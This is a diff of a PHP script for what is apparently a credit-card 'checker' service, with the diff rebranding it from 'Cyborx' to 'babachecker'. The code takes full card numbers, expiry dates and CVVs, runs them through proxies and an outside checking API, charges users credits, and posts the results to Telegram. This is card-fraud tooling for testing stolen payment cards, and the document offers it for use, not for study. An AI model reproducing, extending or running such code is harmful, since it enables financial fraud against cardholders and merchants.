@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php';
 require_once __DIR__ . '/../../app/Db.php';
@@ -33,7 +33,7 @@ $userStatus = strtoupper($userData['status'] ?? 'FREE');
 $userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
 $currentCredits = (int)$userData['credits'];
 if ($userStatus === 'BANNED') {
-    echo json_encode(['Response' => 'You are banned from using Cyborx.']);
+    echo json_encode(['Response' => 'You are banned from using babachecker.']);
     exit;
 }
 if ($currentCredits < 2) {
@@ -244,7 +244,7 @@ $level = $binInfo['level'];
 $issuer = $binInfo['issuer'];
 $country_info = $binInfo['country_info'];
 curl_close($chBin);
-$requestUrl = "https://cyborxchecker.com/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
+$requestUrl = "https://babachecker.com/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
 $req = curl_init();
 curl_setopt_array($req, [
     CURLOPT_URL => $requestUrl,
@@ -341,7 +341,7 @@ if (
         "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
         "━━━━━━━━━━━\n" .
         "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> Cyborx";
+        "[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -407,7 +407,7 @@ if (
         "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
         "━━━━━━━━━━━\n" .
         "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> Cyborx";
+        "[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -463,7 +463,7 @@ if (
         "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
         "━━━━━━━━━━━\n" .
         "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> Cyborx";
+        "[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -518,7 +518,7 @@ if (
         "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
         "━━━━━━━━━━━\n" .
         "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> Cyborx";
+        "[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -573,7 +573,7 @@ if (
         "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
         "━━━━━━━━━━━\n" .
         "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> Cyborx";
+        "[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
